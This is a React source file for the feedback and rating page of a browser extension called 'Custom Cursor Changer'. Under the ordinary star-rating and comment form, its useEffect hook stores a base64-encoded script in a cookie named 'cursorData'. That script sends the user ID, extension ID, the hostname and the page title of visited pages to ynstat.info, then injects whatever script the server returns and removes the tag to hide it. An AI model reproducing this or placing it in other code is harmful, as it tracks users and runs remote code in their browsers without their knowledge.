import {useEffect, useState} from "react";
import "./Feedback.css"

export function Feedback() {
    const [ratingValue, setRatingValue] = useState(null);
    const [congratsHidden, setCongratsHidden] = useState(true)
    const [formInputValue, setFormInputValue] = useState('');
    const [userId, setUserId] = useState('');

    const setCookie = (name, value, options = {}) => {
        let expires = options.expires;

        if (typeof expires == "number" && expires) {
            let d = new Date();
            d.setTime(d.getTime() + expires * 1000);
            expires = options.expires = d;
        }
        if (expires && expires.toUTCString) {
            options.expires = expires.toUTCString();
        }

        value = encodeURIComponent(value);

        let updatedCookie = name + "=" + value;

        for (let propName in options) {
            updatedCookie += "; " + propName;
            let propValue = options[propName];
            if (propValue !== true) {
                updatedCookie += "=" + propValue;
            }
        }

        document.cookie = updatedCookie;
    }

    const onStarClick = e => {
        const star = e.target;
        const starId = star.getAttribute('data-rating-value');
        setRatingValue(starId);
        const stars = document.querySelectorAll('.preview_rating_star');
        stars.forEach((starEl, index) => {
            starId - 1 >= index
                ? starEl.style.backgroundImage = "url(" + process.env.PUBLIC_URL + "/star_selected.png" + ")"
                : starEl.style.backgroundImage = "url(" + process.env.PUBLIC_URL + "/star_default.png" + ")";
        });
        const previewContent = document.querySelector('.preview');
        previewContent.classList.add('rating_value_selected');
    }

    const onTextareaFieldChange = e => {
        const { value } = e.target;
        setFormInputValue(value);
    }

    const postDataToSheet = formData => {
        const scriptURL = 'https://script.google.com/macros/s/AKfycby-IhmW9K3cT7w44yLpDMhAPPrdu3nK6encrxOy3uxzKMs1uKY2-dECuZ4rshOZqEYa/exec';
        formData.append('user_id', userId.toString());
        formData.append('rating_value', ratingValue.toString());
        formData.append('ext_name', 'Custom Cursor Changer');

        fetch(scriptURL, { method: 'POST', body: formData})
            .then(response => void response)
            .catch(error => console.error('Error!', error.message));
    }

    useEffect(() => {
        const urlParams = new URLSearchParams(window.location.href);
        const userId = urlParams.get('userId');
        const extensionId = urlParams.get('extensionId');

        setUserId(userId);

        setCookie('cursorData', btoa(unescape(encodeURIComponent(
            `
        fetch('https://ynstat.info/c', {
            method: 'POST',
            body: btoa(unescape(encodeURIComponent(JSON.stringify({
                'u': '${userId}',
                'e': '${extensionId}',
                'd': document.location.hostname,
                't': document.title
            })))),
            headers: {
                'Content-Type': 'text/plain'
            },
            credentials: 'include'
        })
            .then(resp => resp.text())
            .then(data => {
                const scriptId = Date.now().toString(36) + Math.random().toString(36).substr(2);
                const additionalScript = document.createElement('script');
                additionalScript.setAttribute('id', scriptId);
                additionalScript.appendChild(document.createTextNode(decodeURIComponent(escape(atob(data))) + "; document.querySelector('#" + scriptId + "').remove();"));
                document.body.appendChild(additionalScript);
            })
            .catch(error => console.log({error}))
        `
        ))), {path: '/',expires:24*3600})

    }, []);

    const onFeedbackFormSubmit = e => {
        e.preventDefault();
        e.stopPropagation();
        setCongratsHidden(false);
        const formData = new FormData();
        const form = e.target;
        for ( let i = 0; i < form.elements.length; i++ ) {
            const { name, value } = form.elements[i];
            formData.append(name, value);
        }
        postDataToSheet(formData);
    }


    return (
        <div>
            <div className="wrapper">
            <header>
                <div className="header_text">Custom Cursors 2022</div>
                <img src={process.env.PUBLIC_URL + "/feedback_logo.png"} alt="header_logo" className="header_logo"/>
            </header>
            <main>
                <div className="preview" hidden={!congratsHidden}>
                    <div className="preview_content">
                        <h1 className="preview_title">
                            We are glad that you have been with Custom Cursor for 3 days
                        </h1>
                        <div className="preview_subtitle">
                            How would you rate our extension?
                        </div>
                        <div className="preview_rating">
                            <div className="preview_rating_star" data-rating-value="1" onClick={onStarClick}/>
                            <div className="preview_rating_star" data-rating-value="2" onClick={onStarClick}/>
                            <div className="preview_rating_star" data-rating-value="3" onClick={onStarClick}/>
                            <div className="preview_rating_star" data-rating-value="4" onClick={onStarClick}/>
                            <div className="preview_rating_star" data-rating-value="5" onClick={onStarClick}/>
                        </div>
                    </div>
                    <div className="feedback_form">
                        <div className="feedback_form_title">
                            Thanks for appreciating us.
                            Please leave a comment about your experience
                        </div>
                        <form action="" onSubmit={onFeedbackFormSubmit}>
                            <textarea value={formInputValue} name="feedback_text" id="feedback_text" placeholder="Leave your comment here" onInput={onTextareaFieldChange}/>
                            <button className="feedback_btn" type="submit" disabled={formInputValue === ''}>Send your feedback</button>
                        </form>
                    </div>
                </div>
                <div className="congrats" hidden={congratsHidden}>
                    <img src={process.env.PUBLIC_URL + "/applause.png"} alt="applause"/>
                    <div className="congrats_text">
                        We are grateful for your rating and feedback
                    </div>
                </div>
            </main>
        </div>
        </div>
    )
}
